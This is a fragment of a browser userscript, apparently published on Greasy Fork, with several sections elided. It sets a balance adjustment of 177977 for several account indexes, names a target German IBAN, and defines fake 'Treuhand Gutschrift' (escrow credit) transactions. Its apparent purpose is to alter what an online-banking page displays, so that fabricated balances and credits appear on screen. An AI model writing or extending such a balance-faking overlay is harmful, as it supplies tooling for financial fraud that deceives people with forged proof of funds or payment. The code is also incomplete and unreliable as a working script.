// ==UserScript==
// @name         Ed 4Rec skatilka@web.de better
// @namespace    http://tampermonkey.net/
// @version      12.7777773
// @description  with minus bal handling with gmail rem
// @author       You
...
// @downloadURL https://update.greasyfork.org/scripts/501154/Ed%204Rec%20skatilka%40webde%20better.user.js
// @updateURL https://update.greasyfork.org/scripts/501154/Ed%204Rec%20skatilka%40webde%20better.meta.js
// ==/UserScript==


const MBALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 177977 },
        { index: 1, adjustmentAmount: 177977 },
        { index: 2, adjustmentAmount: 177977 },
        { index: 3, adjustmentAmount: 177977 },
         { index: 5, adjustmentAmount: 177977 },
        // Add more configs as needed
    ];

   // ✅ Amount to add/subtract (can be negative)
    const adjustmentAmount = 177977.00;

    // ✅ Target IBAN (case and whitespace insensitive)
    const IbanCheck = "DE38 7002 0270 0045 5552 16";
    ...
    const transactions = [
        {
            ...
            category:  "Gutschrift",
            categorySub:"Treuhand Gutschrift",
